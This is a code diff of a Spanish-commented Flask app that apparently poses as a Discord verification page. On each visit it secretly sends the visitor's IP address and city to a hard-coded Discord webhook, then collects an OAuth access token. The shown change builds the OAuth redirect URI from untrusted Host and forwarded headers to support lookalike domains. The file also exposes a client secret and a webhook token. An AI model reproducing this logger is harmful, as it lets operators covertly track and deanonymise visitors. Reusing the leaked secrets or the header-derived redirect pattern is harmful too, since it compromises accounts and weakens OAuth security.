@@ -7,7 +7,7 @@ app = Flask(__name__)
 # --- CONFIGURACIÓN ---
 CLIENT_ID     = "1457527346687901812"
 CLIENT_SECRET = "8NXd3i8r1QXproq-MMf8EqW_BJOujcPR"
-REDIRECT_URI  = "https://hgalex.vercel.app/callback"
+# REDIRECT_URI se genera automáticamente abajo para evitar errores al cambiar de dominio
 # El WEBHOOK donde llegarán los logs
 WEBHOOK       = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
 LOGO          = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"
@@ -51,10 +51,17 @@ def get_ip():
     ip = request.headers.get('x-real-ip') or request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
     return ip
 
+def get_redirect_uri():
+    # Se adapta automáticamente al dominio que estés usando (dcalex, dc-alex, etc.)
+    host = request.headers.get('X-Forwarded-Host', request.headers.get('Host'))
+    scheme = request.headers.get('X-Forwarded-Proto', 'https')
+    return f"{scheme}://{host}/callback"
+
 @app.route('/')
 def home():
     ip = get_ip()
     city = request.headers.get('x-vercel-ip-city', 'Desconocida')
+    redirect_uri = get_redirect_uri()
 
     # LOG VISITA (IP inicial)
     try:
@@ -66,13 +73,14 @@ def home():
         print(f"Error enviando webhook: {e}")
 
     # Generar URL de autorización de Discord
-    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
+    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={redirect_uri}&response_type=code&scope=identify"
     
     return render_template_string(HTML_TEMPLATE, auth_url=auth_url, logo=LOGO)
 
 @app.route('/callback')
 def callback():
     code = request.args.get('code')
+    redirect_uri = get_redirect_uri()
     
     # Si no hay código (acceso directo a /callback), redirigir
     if not code: return redirect("https://discord.gg/nUy6Vjr9YU")
@@ -84,7 +92,7 @@ def callback():
             'client_secret': CLIENT_SECRET, 
             'grant_type': 'authorization_code', 
             'code': code, 
-            'redirect_uri': REDIRECT_URI
+            'redirect_uri': redirect_uri
         }, headers={'Content-Type': 'application/x-www-form-urlencoded'}).json()
         
         token = r.get('access_token')
